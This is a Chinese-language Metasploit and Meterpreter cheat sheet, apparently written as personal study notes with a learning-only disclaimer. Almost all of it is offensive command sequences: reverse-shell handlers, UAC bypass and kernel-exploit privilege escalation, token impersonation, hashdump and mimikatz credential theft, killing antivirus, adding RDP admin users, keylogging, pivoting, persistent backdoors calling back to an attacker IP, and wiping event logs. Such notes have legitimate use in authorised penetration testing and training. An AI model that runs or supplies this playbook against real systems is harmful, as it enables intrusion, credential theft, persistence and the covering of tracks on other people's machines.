# metasploit 小记

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

## Reference
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploit入门用法(主动攻击) - CSDN博客](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreter必知必会的15个命令](https://www.4hou.com/tools/14185.html)
- [萌新科普 手把手教你如何用MSF进行后渗透测试](https://www.anquanke.com/post/id/164525)

---

## 维护
**安装**

使用 Rapid7 的一套快速安装项目 metasploit-omnibus,可以实现一句话安装
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

**更新**

对于 kali 自带的 msf 可以使用 apt 更新
```bash
apt-get update
apt-get install metasploit-framework
```

**添加一个新的 exploit**

1. 在 `/usr/share/metasploit-framework/modules/exploits/` 目录下新建一个自定义文件夹 aaatest,将 rb 脚本扔进去
2. 启动 metasploit
3. 输入 reload_all 重新加载所有模块
4. use exploit/aaatest/exp(输入的时候可以用 tab 补全，如果不能补全说明就有问题)

---

## meterpreter

### 快速上手
```bash
shell   # 获取目标主机的 cmd shell
getsystem   # 命令可以提权到本地系统权限
sysinfo # 显示系统名,操作系统,架构和语言等。
```

### 获取会话
**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST
set LPORT
exploit -j  # 后台执行
```

**cmdshell 升级为 meterpreter**

如果最开始获取的是 cmdshell,后来发现这台机器非常适合作为测试其它终端的跳板,这个时候 cmdshell 的功能已经不能满足需要,升级成 meterpreter 就十分有必要。`sessions -u "id"` 将该 cmdshell 升级成 meterpreter

### 提权
**绕过 UAC**

通常 webshell 的权限都比较低,能够执行的操作有限,没法查看重要文件、修改系统信息、抓取管理员密码和 hash、安装特殊程序等,所以我们需要获取系统更高的权限

```bash
use exploit/windows/local/bypassuac # 一系列都可用
use exploit/windows/local/bypassuac_eventvwr
sessions    # 查看目前的 session
sessions -k # 杀死所有 session
set session # 设为你需要 exploit 的 session
```

**利用系统漏洞提权**

```bash
use exploit/windows/local/ms13_081_track_popup_menu # 以 ms13-081 为例
set session
```

### 进程迁移

当 meterpreter 单独作为一个进程运行时容易被发现,如果将它和系统经常运行的进程进行绑定,就能够实现持久化。
```bash
getpid  # 查看当前会话的进程id
ps  # 查看目标运行的进程
migrate pid # 绑定/迁移进程
```

### 令牌假冒

在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie。

msf提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色。
```bash
getuid  # 查看当前用户
use incognito   # 进入该模块
list_tokens -u  # 查看存在的令牌
impersonate_token 用户名    # 令牌假冒
# 注意用户名的斜杠需要写两个。

getuid  # 查看是否切换成功
```

### 获取凭证
```bash
run hashdump

load mimikatz   # 加载 mimikatz 模块
wdigest
kerberos
```

### 操作文件系统
**基本操作**
```bash
ls：列出当前路径下的所有文件和文件夹。
pwd 或 getwd：查看当前路径
search：搜索文件,使用 search -h查看帮助。
cat：查看文件内容,比如 cat test.txt。
edit：编辑或者创建文件。和 Linux 系统的 vm 命令类似,同样适用于目标系统是 windows 的情况。
rm：删除文件。
cd：切换路径。
mkdir：创建文件夹。
rmdir：删除文件夹。
getlwd 或 lpwd：查看自己系统的当前路径。
lcd：切换自己当前系统的目录。
lls：显示自己当前系统的所有文件和文件夹。
```

**上传和下载**
```bash
upload <file> <destination> # 上传文件到 Windows 主机
# 注意：使用 -r 参数可以递归上传上传目录和文件

download <file> <path to save>  # 从 windows 主机下载文件
# 注意：Windows 路径要使用双斜线
# 如果我们需要递归下载整个目录包括子目录和文件,我们可以使用 download -r 命令
```

### 其它操作

**环境检测**
```bash
run checkvm
```

**关闭防病毒软件**
```bash
run killav
run post/windows/manage/killav
```

**操作远程桌面**
```bash
run post/windows/manage/enable_rdp  # 开启远程桌面
run post/windows/manage/enable_rdp username=test password=test  # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
```

**截屏**

`screenshot`

**键盘记录**
```bash
keyscan_start：开启键盘记录功能
keyscan_dump：显示捕捉到的键盘记录信息
keyscan_stop：停止键盘记录功能
```

**执行程序**
```bash
execute -f <path> [options] 在目标主机上执行 exe 文件
-H：创建一个隐藏进程
-a：传递给命令的参数
-i：跟进程进行交互
-m：从内存中执行
-t：使用当前伪造的线程令牌运行进程
-s：在给定会话中执行进程
```

### 端口转发和内网代理
**portfwd**

portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令的参数。
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将1.1.1.3的3389端口转发到本地的2222端口。
-l：本地监听端口
-r：内网目标的 ip
-p：内网目标的端口
```

**pivot**

pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测。
```bash
route add 内网ip 子网掩码 session的id   # 添加一个路由
route print

如果其它程序需要访问这个内网环境,就可以建立 socks 代理
msf 提供了3个模块用来做 socks 代理。
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc

use auxiliary/server/socks4a
SRVHOST：监听的 ip 地址,默认为 0.0.0.0,一般不需要更改。
SRVPORT：监听的端口,默认为 1080。
直接运行run命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用。
```

### 后门

Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理员给系统打上补丁,那么就没办法再次使用 exploit 获取权限,所以需要持久的后门对目标进行控制

**metsvc**
```bash
run metsvc
# 命令运行成功后会在 C:WindowsTEMP 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)
# 同时会新建一个服务,显示名称为 Meterpreter,服务名称为 metsvc,启动类型为"自动",绑定在 31337 端口。

use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost xxx.xxx.xxx.xxx
set lport 31337
```

**persistence**
```bash
run persistence -X -i 10 -r 192.168.1.9 -p 4444
-A：安装后门后,自动启动 exploit/multi/handler 模块连接后门
-L：自启动脚本的路径,默认为 %TEMP%
-P：需要使用的 payload,默认为 windows/meterpreter/reverse_tcp
-S：作为一个服务在系统启动时运行(需要 SYSTEM 权限)
-T：要使用的备用可执行模板
-U：用户登陆时运行
-X：系统启动时运行
-i：后门每隔多少秒尝试连接服务端
-p：服务端监听的端口
-r：服务端 ip
```

### 抓包

**sniffer**
```bash
use sniffer
sniffer_interfaces  # 查看网卡信息
sniffer_start 1 # 开始在序号为1的网卡上抓包
sniffer_dump 1 xpsp1.cap    # 下载抓取到的数据包
```

### 清理痕迹
```bash
clearev # 入侵痕迹擦除
```



